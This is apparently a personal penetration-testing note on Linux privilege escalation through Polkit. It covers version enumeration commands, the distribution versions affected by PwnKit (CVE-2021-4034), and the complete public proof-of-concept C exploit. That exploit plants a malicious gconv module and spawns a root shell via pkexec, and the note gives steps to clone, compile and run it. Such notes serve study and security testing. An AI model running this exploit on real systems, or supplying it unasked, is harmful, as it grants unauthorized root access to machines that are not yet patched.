---
id: Polkit
aliases: []
tags:
  - Linux/Privesc/Polkit
links: "[[Privesc]]"
---

# Polkit

Escalate privileges via [[General/Polkit|Polkit]]

___

<!-- Enumeration {{{-->
## Enumeration

Enumerate installed polkit version

```sh
pkcheck --version
```

```sh
polkitd --version
```

```sh
dpkg -s policykit-1
```

```sh
dpkg -l | grep policykit
```

```sh
rpm -qa | grep polkit
```

___
<!-- }}} -->

<!-- PwnKit {{{-->
## PwnKit

[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) —
The PwnKit vulnerability affects [[Polkit]]’s `pkexec`

<!-- Affected Versions {{{-->
> [!todo]- Affected Versions
>
> Debian
>
> - < `0.105-18+deb9u2` (stretch)
> - < `0.105-25+deb10u1` (buster)
> - < `0.105-31+deb11u1` (bullseye)
> - < `0.105-31.1` (unstable / bookworm)
>
> Ubuntu
>
> - 14.04 ESM: < `policykit-1 0.105-4ubuntu3.14.04.6+esm1`
> - 16.04 ESM: < `policykit-1 0.105-14.1ubuntu0.5+esm1 `
> - 18.04 LTS: < `policykit-1 0.105-20ubuntu0.18.04.6 `
> - 20.04 LTS: < `policykit-1 0.105-26ubuntu1.2 `
> - 21.10: < `policykit-1 0.105-31ubuntu0.1 `
>
> RHEL/CentOS 6
>
> - polkit < `0.96-11.el6_10.2`
>
> RHEL/CentOS 7
>
> - polkit < `0.112-26.el7_9.1`
>
> RHEL/CentOS 8
>
> - polkit < `0.115-13.el8_5.1`
>
> Fedora
>
> - polkit < `0.120-1.fc35.1`
>
> SUSE Linux Enterprise
>
> - polkit ≥ `0.115-13.el8_5.1`
>
> SUSE SLE 15 SP4+/SP5:
>
> - polkit/libpolkit ≥ `0.116-3.6.1`
<!-- }}} -->

[GitHub - arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c)

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> ```sh
> touch exploit.c
> ```
> ```sh
> vim exploit.c
> ```
> ```sh
> gcc exploit.c -o exploit
> ```
> ```sh
> ./exploit
> ```
>
> ```c
> /*
>  * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
>  * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
>  */
> #include <stdio.h>
> #include <stdlib.h>
> #include <unistd.h>
> 
> char *shell = 
> 	"#include <stdio.h>\n"
> 	"#include <stdlib.h>\n"
> 	"#include <unistd.h>\n\n"
> 	"void gconv() {}\n"
> 	"void gconv_init() {\n"
> 	"	setuid(0); setgid(0);\n"
> 	"	seteuid(0); setegid(0);\n"
> 	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
> 	"	exit(0);\n"
> 	"}";
> 
> int main(int argc, char *argv[]) {
> 	FILE *fp;
> 	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
> 	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
> 	fp = fopen("pwnkit/pwnkit.c", "w");
> 	fprintf(fp, "%s", shell);
> 	fclose(fp);
> 	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
> 	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
> 	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
> }
> ```
<!-- }}} -->

```sh
git clone https://github.com/arthepsy/CVE-2021-4034.git
```
```sh
cd CVE-2021-4034
```
```sh
gcc cve-2021-4034-poc.c -o poc
```
```sh
./poc
```

___
<!-- }}} -->
